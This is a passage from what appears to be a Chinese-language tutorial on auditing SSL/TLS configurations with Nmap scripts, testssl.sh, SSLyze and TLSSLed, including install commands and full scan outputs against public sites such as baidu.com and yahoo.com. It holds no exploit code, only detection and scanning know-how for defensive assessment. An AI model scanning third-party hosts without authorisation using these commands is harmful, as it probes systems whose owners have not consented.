strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.2: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>_  least strength: strongNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.23 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(3) More</p><p>您还可以使用Nmap脚本查找众所周知的ssl和tls漏洞</p><ul><li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection</a>：允许MITM攻击的连接设置错误（<a href="http://ccsinjection.lepidum.co.jp/">ccs-injection-vuln</a>，<a href="https://www.tripwire.com/state-of-security/vulnerability-management/openssl-ccs-injection-primer/">ccs-injection-primer</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-cert-intaddr.html">ssl-cert-intaddr</a>：内部IP地址泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date</a>：远程服务器时间泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params</a>：使用弱<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman</a>参数</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed</a>：易受OpenSSL <a href="https://www.us-cert.gov/ncas/alerts/TA14-098A">Heartbleed </a><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">攻击</a></li><li><a href="https://nmap.org/nsedoc/scripts/ssl-known-key.html">ssl-known-key</a>：服务器正在使用已知的错误证书</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle</a>：服务器允许易受攻击的SSLv3 CBC密码（<a href="https://www.us-cert.gov/ncas/alerts/TA14-290A">POODLE</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2</a>：服务器允许使用过时的SSLv2密码</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2-drown.html">sslv2-drown</a>：服务器允许与<a href="https://www.us-cert.gov/ncas/current-activity/2016/03/01/SSLv2-DROWN-Attack">DROWN</a>攻击相关的SSLv2密码</li></ul><h2 id="4-testssl"><a href="#4-testssl" class="headerlink" title="4 testssl"></a>4 testssl</h2><p>testssl.sh是我们首选的测试工具，它涵盖了TLS和SSL评估所需的所有测试所需工具，并定期更新。</p><h3 id="4-1-安装"><a href="#4-1-安装" class="headerlink" title="4.1 安装"></a>4.1 安装</h3><pre><code>git clone https://github.com/drwetter/testssl.sh.git</code></pre><h3 id="4-2-testssl-sh示例"><a href="#4-2-testssl-sh示例" class="headerlink" title="4.2 testssl.sh示例"></a>4.2 testssl.sh示例</h3><p>有许多可以用于testssl.sh的测试选项，您应该使用的选项将在很大程度上取决于您的测试要求。以下是部分有关testssl.sh命令行选项的示例。运行./testssl.sh可以看到所有选项。详情见 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><pre><code>[root@m01ly ~]#  cd testssl.sh[root@m01ly testssl.sh]# ./testssl.sh -e www.baidu.com</code></pre><p>它是在CentOS 7上运行的, 如果你遇到相同的问题, 则可以通过以下方法解决它。Fatal error: Neither “dig”, “host”, “drill” or “nslookup” is present<img src="/2020/08/26/htps-tools/1614074377668.png" alt="1614074377668"></p><p><strong>solution：</strong>当程序找不到任何实用程序来解析IP或域时, 就会发生这种情况。你可以安装bind-utils来修复错误。</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-0-测试单个主机上的TLS版本并输出到控制台"><a href="#4-2-0-测试单个主机上的TLS版本并输出到控制台" class="headerlink" title="4.2.0 测试单个主机上的TLS版本并输出到控制台"></a>4.2.0 测试单个主机上的TLS版本并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -p TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh --warnings<span class="token operator">=</span>batch --html 172.24.110.10:6443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-1-测试单个主机上的所有内容并输出到控制台"><a href="#4-2-1-测试单个主机上的所有内容并输出到控制台" class="headerlink" title="4.2.1 测试单个主机上的所有内容并输出到控制台"></a>4.2.1 测试单个主机上的所有内容并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML-1"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML-1" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-3测试子网上的所有主机并输出到HTML"><a href="#4-2-3测试子网上的所有主机并输出到HTML" class="headerlink" title="4.2.3测试子网上的所有主机并输出到HTML"></a>4.2.3测试子网上的所有主机并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与上述相同，但只列举每个服务器支持的密码类型：</p><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -E 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有很多功能。</p><h2 id="5-SSLyze"><a href="#5-SSLyze" class="headerlink" title="5 SSLyze"></a>5 SSLyze</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1 安装"></a>5.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">$ pip <span class="token function">install</span> --upgrade setuptools$ pip <span class="token function">install</span> --upgrade sslyze<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-2-使用"><a href="#5-2-使用" class="headerlink" title="5.2 使用"></a>5.2 使用</h3><pre class="line-numbers language-bash"><code class="language-bash">$ python -m sslyze --regular www.yahoo.com:443 www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"> SCAN RESULTS FOR WWW.YAHOO.COM:443 - 202.165.107.50 --------------------------------------------------- * Deflate Compression:                                          OK - Compression disabled * SSLV3 Cipher Suites:      Server rejected all cipher suites. * TLSV1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * Session Renegotiation:       Client-initiated Renegotiation:    OK - Rejected       Secure Renegotiation:              OK - Supported * OpenSSL CCS Injection:                                          OK - Not vulnerable to OpenSSL CCS injection * SSLV2 Cipher Suites:      Server rejected all cipher suites. * Certificate Information:     Content       SHA1 Fingerprint:                  3672d010de4097e1d06898229df2821a1b49a2a1       Common Name:                       *.www.yahoo.com       Issuer:                            DigiCert SHA2 High Assurance Server CA       Serial Number:                     9093429354078714021559623999443547105       Not Before:                        2020-05-11 00:00:00       Not After:                         2020-11-07 12:00:00       Signature Algorithm:               sha256       Public Key Algorithm:              EllipticCurve       Key Size:                          256       Curve:                             secp256r1       DNS Subject Alternative Names:     <span class="token punctuation">[</span>u<span class="token string">'yahoo.com'</span>, u<span class="token string">'*.yahoo.com'</span>, u<span class="token string">'*.www.yahoo.com'</span>, u<span class="token string">'mbp.yimg.com'</span>, u<span class="token string">'*.media.yahoo.com'</span>, u<span class="token string">'brb.yahoo.net'</span>, u<span class="token string">'*.att.yahoo.com'</span>, u<span class="token string">'s.yimg.com'</span>, u<span class="token string">'*.amp.yimg.com'</span>, u<span class="token string">'fr-ca.rogers.yahoo.com'</span>, u<span class="token string">'tw.rd.yahoo.com'</span>, u<span class="token string">'ddl.fp.yahoo.com'</span>, u<span class="token string">'ca.rogers.yahoo.com'</span>, u<span class="token string">'ca.my.yahoo.com'</span>, u<span class="token string">'add.my.yahoo.com'</span>, u<span class="token string">'*.global.vespa.oath.cloud'</span>, u<span class="token string">'hk.rd.yahoo.com'</span><span class="token punctuation">]</span>     Trust       Hostname Validation:               OK - Certificate matches www.yahoo.com       Android CA Store <span class="token punctuation">(</span>8.1.0_r9<span class="token punctuation">)</span>:       OK - Certificate is trusted       iOS CA Store <span class="token punctuation">(</span>11<span class="token punctuation">)</span>:                 OK - Certificate is trusted       Java CA Store <span class="token punctuation">(</span>jre-10.0.2<span class="token punctuation">)</span>:        OK - Certificate is trusted       macOS CA Store <span class="token punctuation">(</span>High Sierra<span class="token punctuation">)</span>:      OK - Certificate is trusted       Mozilla CA Store <span class="token punctuation">(</span>2018-04-12<span class="token punctuation">)</span>:     OK - Certificate is trusted       Windows CA Store <span class="token punctuation">(</span>2018-06-30<span class="token punctuation">)</span>:     OK - Certificate is trusted       Symantec 2018 Deprecation:         OK - Not a Symantec-issued certificate       Received Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA       Verified Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA --<span class="token operator">></span> DigiCert High Assurance EV Root CA       Received Chain Contains Anchor:    OK - Anchor certificate not sent       Received Chain Order:              OK - Order is valid       Verified Chain contains SHA1:      OK - No SHA1-signed certificate <span class="token keyword">in</span> the verified certificate chain     Extensions       OCSP Must-Staple:                  NOT SUPPORTED - Extension not found       Certificate Transparency:          WARNING - Only 2 SCTs included but Google recommends 3 or <span class="token function">more</span>     OCSP Stapling       OCSP Response Status:              successful       Validation w/ Mozilla Store:       OK - Response is trusted       Responder Id:                      5168FF90AF0207753CCCD9656462A212B859723B       Cert Status:                       good       Cert Serial Number:                06D754AE96D28371A4DEF60AC211B3E1       This Update:                       Aug 19 15:03:00 2020 GMT       Next Update:                       Aug 26 14:18:00 2020 GMT * Resumption Support:      With Session IDs:                  NOT SUPPORTED <span class="token punctuation">(</span>0 successful, 5 failed, 0 errors, 5 total attempts<span class="token punctuation">)</span>.      With TLS Tickets:                  OK - Supported * TLSV1_1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * TLSV1_3 Cipher Suites:      Server rejected all cipher suites. * OpenSSL Heartbleed:                                          OK - Not vulnerable to Heartbleed * Downgrade Attacks:       TLS_FALLBACK_SCSV:                 OK - Supported * ROBOT Attack:                                          OK - Not vulnerable * TLSV1_2 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        RSA_WITH_AES_256_CCM_8                            -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_256_CCM                              -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA256                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256     -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM_8                    -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_GCM_SHA384                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM_8                            -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM                              -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM_8                    -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_GCM_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  SCAN COMPLETED IN 7.29 S<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-TLSSLed"><a href="#6-TLSSLed" class="headerlink" title="6 TLSSLed"></a>6 TLSSLed</h2><p>该工具是基于sslscan的脚本工具，使用非常简单。用户可以一次性执行所有检测任务，并且会生成详细的日志文件。它可以检测支持的协议类型、空密码和弱密码以及强密码等功能。</p><pre><code>[root@localhost ~]# yum install tlssled[root@localhost ~]# tlssled [ip/domain] 443</code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tlssled www.baidu.com 443</span>------------------------------------------------------ TLSSLed - <span class="token punctuation">(</span>1.3<span class="token punctuation">)</span> based on sslscan and openssl                 by Raul Siles <span class="token punctuation">(</span>www.taddong.com<span class="token punctuation">)</span>------------------------------------------------------    openssl version: OpenSSL 1.1.1g  21 Apr 2020    sslscan version 1.10.2 ------------------------------------------------------    Date: 20200821-110138------------------------------------------------------<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Analyzing SSL/TLS on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">if</span> the target <span class="token function">service</span> speaks SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> The target <span class="token function">service</span> www.baidu.com:443 seems to speak SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Using SSL/TLS protocol version:         <span class="token punctuation">(</span>empty means I'm using the default openssl protocol version<span class="token punctuation">(</span>s<span class="token punctuation">))</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running sslscan on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv2 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the NULL cipher <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> weak ciphers <span class="token punctuation">(</span>based on key length - 40 or 56 bits<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> strong ciphers <span class="token punctuation">(</span>based on AES<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLS11  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS11  256 bits  AES256-SHA    Accepted  TLS11  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS11  128 bits  AES128-SHA    Accepted  TLS12  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS12  256 bits  AES256-SHA    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-GCM-SHA256    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS12  128 bits  AES128-SHA    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> MD5 signed certificate <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate public key length <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate subject <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate CA issuer <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate validity period <span class="token punctuation">..</span>.    Today: Fri Aug 21 03:02:05 UTC 2020    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Checking preferred server ciphers <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation MitM vuln. <span class="token punctuation">(</span>CVE-2009-3555<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> secure renegotiation support <span class="token punctuation">(</span>RFC 5746<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Secure Renegotiation IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation DoS vuln. <span class="token punctuation">(</span>CVE-2011-1473<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>secure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span>    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>insecure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client authentication using digital certificates <span class="token punctuation">..</span>.    SSL/TLS client certificate authentication IS NOT required<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 and v1.2 <span class="token punctuation">(</span>CVE-2011-3389 vuln. aka BEAST<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv3 and TLSv1 support <span class="token punctuation">..</span>.    Accepted  SSLv3  112 bits  RC4-SHA    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLSv1  112 bits  ECDHE-RSA-RC4-SHA    Accepted  TLSv1  112 bits  RC4-SHA    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> RC4 <span class="token keyword">in</span> the prefered cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span> list <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 support <span class="token punctuation">..</span>.    TLS v1.1 IS supported    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.2 support <span class="token punctuation">..</span>.    TLS v1.2 IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.0 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.1 <span class="token operator">&amp;</span> Host <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token 